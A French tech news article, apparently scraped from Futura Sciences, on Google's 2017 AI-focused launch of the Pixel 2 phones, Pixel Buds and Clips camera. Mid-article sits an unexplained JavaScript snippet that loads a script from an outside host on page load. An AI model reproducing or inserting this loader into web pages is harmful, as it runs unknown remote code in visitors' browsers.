{"title": "Pixel 2, Clips, Buds : Google mise tout sur l'intelligence artificielle", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "05/10/2017", "content": "Google a dévoilé toute une série de nouveaux produits, parmi lesquels ses smartphones Pixel 2 et Pixel 2XL, des écouteurs sans fil (Pixel Buds) et un appareil photo miniature (Google Clips). Tous ont en commun un recours systématique à des fonctions d'intelligence artificielle. Ce qu'il faut retenir Google veut que l’intelligence artificielle (IA) façonne la conception de ses produits. La marque a présenté de nouveaux smartphones Android, des écouteurs sans fil et un appareil photo miniature qui exploitent l’IA pour proposer des fonctionnalités avancées. Google  n'est pas un constructeur de matériel au sens d'un Apple ou d'un Samsung. Le géant californien ne cherche d'ailleurs pas à rivaliser en jouant la surenchère technologique avec les produits qu'il propose. Mais il possède un atout majeur pour se distinguer de ses concurrents dans la bataille qu'il leur livre : l' intelligence artificielle  (IA). Dans ce domaine, Google dispose d'une avance considérable sur ses principaux rivaux. L'IA est présente depuis déjà un certain temps dans la plupart de ses services : Assistant Google, Google Photos, Google Maps, Google Traduction,  GMail ... Mis à part Amazon et son  assistant vocal  Alexa, personne ne rivalise sérieusement avec Google en ce qui concerne l'intégration de l' intelligence artificielle  à des produits grand public. Lors de la conférence de présentation de ses nouveaux  smartphones  et gadgets connectés, Sundar Pichai, le patron de  Google , a d'ailleurs souligné que le mantra de son entreprise était désormais  « AI first »,    c'est-à-dire  « l'IA en premier ».  L'intelligence artificielle n'est plus seulement intégrée aux produits, elle en façonne la conception. Une approche radicalement différente de celles des autres acteurs et qui transparaît dans les nouveaux produits dévoilés hier. En résumé, Google veut nous faire vivre avec des  smartphones  et des objets connectés capables d'apprendre et de devancer nos attentes.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pixel 2 et Pixel 2 XL : l'IA aux commandes de l'image Les deux nouveaux smartphones  Pixel 2 et Pixel 2 XL  n'ont rien d'exceptionnel d'un point de vue matériel, comparés aux Samsung Galaxy S8, Note 8 ou aux  iPhone  8 et iPhone X d'Apple. Et Google a surpris les observateurs en optant pour un appareil photo vidéo arrière à un seul  capteur  alors que la tendance actuelle sur le haut de gamme est aux doubles capteurs. Un choix que l'intéressé défend en mettant en avant les performances de ses algorithmes qui gèrent la détection des visages pour créer des portraits avec effet  bokeh  et la stabilisation de l'image.  Les  Pixel  2 reçoivent aussi l' application  Google Lens, qui, lorsque l'on pointe l'appareil photo sur un objet, va le numériser et fournir des informations pertinentes à son sujet. Cela fonctionne notamment avec les œuvres d'art, les livres et les cartes de visite. Signalons aussi la présence de l'application Music Detection, qui fonctionne en arrière-plan. Elle identifie n'importe quel morceau de musique qu'elle entend et en indique le titre et le nom de l'artiste sur l'écran de verrouillage.  Le Pixel 2 est doté d'un écran Oled 5 pouces. Son prix est de 799 euros pour le modèle 64 Go et 909 euros pour le modèle 128 Go. Le Pixel 2 XL offre un écran Oled 6 pouces. Il coûte 939 euros pour la version 64 Go et 1.049 euros pour le 128 Go. Ils seront disponibles à partir du 17 octobre dans plusieurs pays européens (Allemagne, Italie, Royaume-Uni), mais pas en France. Les smartphones Pixel 2 et Pixel 2 XL, de Google, ne seront pas disponibles en France. © Google                               Les écouteurs Pixel Buds peuvent traduire 40 langues en temps réel Avec les  écouteurs  sans fil  Pixel Buds , Google ne fait pas que répondre aux AirPods d'Apple, mais livre une démonstration d'intégration de l'IA. Il suffit de toucher la zone tactile de l'oreillette droite pour contrôler l'Assistant Google et lui demander de lire de la musique, passer un appel ou lancer la navigation assistée par guidage vocal. L'Assistant Google peut aussi diffuser des notifications sur des évènements du calendrier et lire des messages. Mais ce n'est pas tout... Les Pixel Buds peuvent traduire en temps réel 40 langues en s'appuyant sur Google Traduction. L'utilisateur demande aux écouteurs de traduire une langue donnée, il parle dans sa langue et la traduction est lue simultanément sur les haut-parleurs de son smartphone  Android . Les Pixel Buds coûtent 179 euros. On ne les trouvera pas en France, mais en Allemagne et au Royaume-Uni.  Les écouteurs sans fil Pixel Buds, de Google, offrent 5 heures d’autonomie en lecture. © Google                               Google Clips, l'appareil photo qui décide à votre place C'est sans doute le gadget le plus étonnant dévoilé par Google. Le Clips est un appareil photo miniature capable de décider de prendre une photo s'il estime que la scène vaut la peine d'être immortalisée. On peut le poser ou l'accrocher n'importe où chez soi et le laisser travailler. Selon Google, l'idée est de saisir des instants spontanés pour lesquels on n'a pas le temps de dégainer son  smartphone . L’appareil photo Google Clips intègre un algorithme d’apprentissage automatique pour décider du moment opportun de prendre une photo. © Google                               L'appareil utilise l'apprentissage automatique pour reconnaître les visages familiers, identifier des scènes pertinentes et de bonnes conditions de prise de vue. Les photos sont envoyées au smartphone et l'on décide ensuite ce que l'on veut en faire : partager, enregistrer sur Google Photos, retoucher, supprimer... Google précise que le travail d'analyse du Clips se déroule au niveau de l'appareil, sans aucune connexion à un service en ligne, ce qui préserve la vie privée des utilisateurs. Ce produit ne sera pour le moment disponible qu'aux États-Unis au prix de 249 dollars (212 euros au cours actuel). Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  intelligence artificielle  |  ia intelligence artificielle  |  tpe intelligence artificielle  |  intelligence artificielle debat  |  logiciels intelligence artificielle  |  logiciel intelligence artificielle  |  problematique tpe intelligence artificielle  |  vie artificielle", "theme": "tech"}